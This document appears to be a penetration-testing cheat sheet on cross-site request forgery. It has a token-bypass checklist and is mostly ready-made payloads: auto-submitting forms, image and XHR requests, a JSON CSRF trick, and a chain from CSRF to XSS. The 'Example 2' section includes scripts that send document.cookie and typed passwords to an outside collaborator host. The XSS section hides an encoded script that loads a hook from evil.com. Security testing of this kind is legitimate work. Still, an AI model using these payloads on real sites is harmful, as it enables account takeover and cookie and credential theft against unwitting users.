# CSRF

## Cross-Site Request Forgery (CSRF)

### What is it?

CSRF, short for Cross-site request forgery, is a type of web security flaw that enables an attacker to trick users into executing actions they didn't intend to do.

**A simple example:**

* A vulnerable web application has the endpoint `/updateProfile?id={userid}`
* When a `POST` request is made to this endpoint the application:
  * Checks the ID is the current user
  * If it is, update the profile with the provided information in the request body
* When the victim visits the attacker's malicious site, it will:
  * Send a request to the vulnerable web application
  * Because the user is logged into that application, the browser will include cookies (importantly, the session cookie)
* The vulnerable application processes the request as normal since it came from the user

It's important to note that we need some user interaction for CSRF to work. Typically an attacker would place their payload on a site that they control, and try to entice the target with phishing emails, direct messages on social media, etc. Once the user clicks the link and lands on the page, the payload is triggered.

CSRF defences are now pretty common, so along with just finding places where users can carry out actions, we also need to be able to bypass defences that have not been properly implemented.

**Other learning resources:**

* PortSwigger: Web Security Academy [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* The XSS Rat: Bug Bounty Beginner Methodology: CSRF [https://www.youtube.com/watch?v=uirJsgvN7Hc](https://www.youtube.com/watch?v=uirJsgvN7Hc)
* Swisskeyrepo: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md)

**Writeups:**

*

### Checklist

* [ ] Does every form have a CSRF token?
* [ ] Can we use GET instead of POST (i.e. can our payload be in the URI instead of the body)
* [ ] Test the token
  * [ ] Test without the token
    * [ ] Test other HTTP methods without the token (e.g. GET)
  * [ ] Test without the token value (keep the param name, e.g. \&csrf=)
  * [ ] Test with a random token
  * [ ] Test a previous token
  * [ ] Test a token from a different session
  * [ ] Test with a token of the same length
  * [ ] Test for predictability
  * [ ] Test for static values
    * [ ] Test for known values (e.g. the token is the user-id)
  * [ ] Is the token tied to a cookie other than the session cookie?
  * [ ] Can the token be stolen with XSS?
* [ ] Is the referer header being used to validate the request origin?
* [ ] Do the cookies have SameSite set? (Chrome is lax by default)
  * [ ] Can we submit the request with GET?
  * [ ] Can we override HTTP methods with \`X-Http-Method-Override: GET\`
  * [ ] Can we override HTTP methods with \`\_method=POST\`

### Exploitation

```shellscript
<!-- original payload generated from BURP Suite Pro -->
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://<target-site>/api/employees/add" method=POST>
      <input type="hidden" name="name" value="<payload-info>" />
      <input type="hidden" name="email" value="<payload-info>" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

```shellscript
<!-- requires user interaction -->
<a href="http://<target-site>m/api/employees/add?name=<payload-info>">Click Me</a>
```

```shellscript
<!-- doesn't require user interaction -->
<img src="http:/<target-site>/api/employees/add?name=<payload-info>">
```

```shellscript
document.location = 'https://<target-site>/employees/add?name=<payload-info>';
```

### Summary

{% hint style="info" %}
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.

3 conditions:

* A relevant action.
* Cookie-based session handling.
* No unpredictable request parameters.

How to find:

* Remove CSRF token from requests and/or put a blank space.
* Change POST to GET.
* Replace the CSRF token with a random value (for example 1).
* Replace the CSRF token with a random token of the same restraints.
* Extract token with HTML injection.
* Use a CSRF token that has been used before.
* Bypass regex.
* Remove referer header.
* Request a CSRF by executing the call manually and use that token for the request.
{% endhint %}

#### Approach

```shellscript
- Removing the token parameter entirely
- Setting the token to a blank string
- Changing the token to an invalid token of the same format
- Using a different user's token
- Put the parameters in the URL instead of POST body (and remove the token) and change the HTTP verb to GET
- Testing every sensitive endpoint
- Check whether the token might be guessed / cracked
- Check whether new tokens are generated for every session, if not they may be a hash of something simple like the user's email address. If so you can craft your own valid tokens.
- Try building the payload with multiple methods including a standard HTML form, multipart form, and XHR (Burp can help)
```

#### Quick attacks

```html
# HTML GET
<a href=”http://vulnerable/endpoint?parameter=CSRFd">Click</a>

# HTML GET (no interaction)
<img src=”http://vulnerable/endpoint?parameter=CSRFd">

# HTML POST:
<form action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>

# HTML POST (no interaction)
<form id="autosubmit" action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>
<script>
document.getElementById("autosubmit").submit();
</script>

# JSON GET:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://vulnerable/endpoint");
xhr.send();
</script>

# JSON POST
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable/endpoint");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":admin}');
</script>
```

### Tools

```bash
# https://github.com/0xInfection/XSRFProbe
xsrfprobe --help

https://csrfshark.github.io/
```

### Example 1

```shellscript
Vulnerable request example:
__
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
__

HTML with attack:
__
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
__
```

### Example 2

```shellscript
# Exploit CSRF in GET:
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">

- SameSite cookie property avoid the attack:
   → Only from same site:
    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict; 
   → From other site only if GET and requested by click, not scripts (vulnerable if CSRF in GET or POST converted to GET):    
    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax; 

<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### **Json CSRF**

```shellscript
Requirements:

1. The authentication mechanism should be in the cookie-based model. (By default cookie-based authentication is vulnerable to CSRF attacks)
2. The HTTP request should not be fortify by the custom random token on the header as well in the body.(X-Auth-Token)
3. The HTTP request should not be fortify by the Same Origin Policy.

Bypass 2 & 3:
• Change the request method to GET append the body as query parameter.
• Test the request without the Customized Token (X-Auth-Token) and also header.
• Test the request with exact same length but different token.

If post is not allowed, can try with URL/param?_method=PUT


<body onload='document.forms[0].submit()'>
<form action="https://<vulnerable-url>?_method=PUT" method="POST" enctype="text/plain">
  <input type="text" name='{"username":"blob","dummy":"' value='"}'>
  <input type="submit" value="send">
</form>

<!---This results in a request body of:
{"username":"blob", "dummy": "="} -->
```

### **CSRF Token Bypass**

```shellscript
CSRF Tokens

Unpredictable value generated from the server to the client, when a second request is made, server validate this token and reject the request if is missing or invalid. Prevent CSRF attack because the malicious HTTP request formed can't know the CSRF Token generated for the victim.
   → Is transmited to the client through a hidden field:


- Example:
    __
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

    csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com
    __

- Validation depends on method (usually POST):
    __
    GET /email/change?email=pwned@evil-user.net HTTP/1.1
    Host: vulnerable-website.com
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
    __

- Validation depend on token is present (if not, validation is skipped):
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

    email=pwned@evil-user.net
    --
- CSRF not tied to user session

- CSRF tied to a non-session cookie:
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

    csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
    --

- CSRF token duplicated in cookie:
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

    csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
    --

- Validation of referer depends on header present (if not, validation is skipped)

- Circumvent referer validation (if only checks the domain existence)

- Remove Anti-CSRF Token
- Spoof Anti-CSRF Token by Changing a few bits
- Using Same Anti-CSRF Token
- Weak Cryptography to generate Anti-CSRF Token
- Guessable Anti-CSRF Token
- Stealing Token with other attacks such as XSS.
- Converting POST Request to GET Request to bypass the CSRF Token Check. (This is what we will see for this article)

Other validations bypasses:
1) remove anticsrf tokens & parameter
2) pass blank paramter
3) add same length token
4) add another userss valid anti csrf token
5) random token in long length (aaaaaaaaa) 
6) Try decode token
7) Use only static part of the token
```

### CSRF sample POC

```shellscript
<html>
<script>
function jsonreq() {
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.open("POST","https://target.com/api/endpoint", true);
  xmlhttp.setRequestHeader("Content-Type","text/plain");
  //xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xmlhttp.withCredentials = true;
  xmlhttp.send(JSON.stringify({"test":"x"}));
}
jsonreq();
</script>
</html>
```

### CSRF to reflected XSS

```shellscript
<html>
  <body>
    <p>Please wait... ;)</p>
    <script>
let host = 'http://target.com'
let beef_payload = '%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e'
let alert_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E'

function submitRequest() {
  var req = new XMLHttpRequest();
  req.open(<CSRF components, which can easily be copied from Burp's POC generator>);
  req.setRequestHeader("Accept", "*\/*");
  req.withCredentials = true;
  req.onreadystatechange = function () {
    if (req.readyState === 4) {
      executeXSS();
    }
  }
  req.send();
}

function executeXSS() {
  window.location.assign(host+'<URI with XSS>'+alert_payload);
}

submitRequest();
    </script>
  </body>
</html>
```

### Mindmaps

![](https://camo.githubusercontent.com/1216587b905ccfe5114a4420caad3369e49d57c12d9c837a78330733540f9a12/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f4559373062786b576b4141467a47623f666f726d61743d6a7067266e616d653d39303078393030)

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MLlrRPySFP4sbLBIvyo%2F-MLlrfC3S6ffP6wir1G9%2Fimage.png?alt=media\&token=95fdeefe-1689-4b21-bed8-c80d0e447e31)

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MMEgNye5ccuPNIT3szg%2F-MMEjpnylQQjuMI6uPM3%2Fimage.png?alt=media\&token=86373c40-22e8-446d-8ca9-805b54747909)
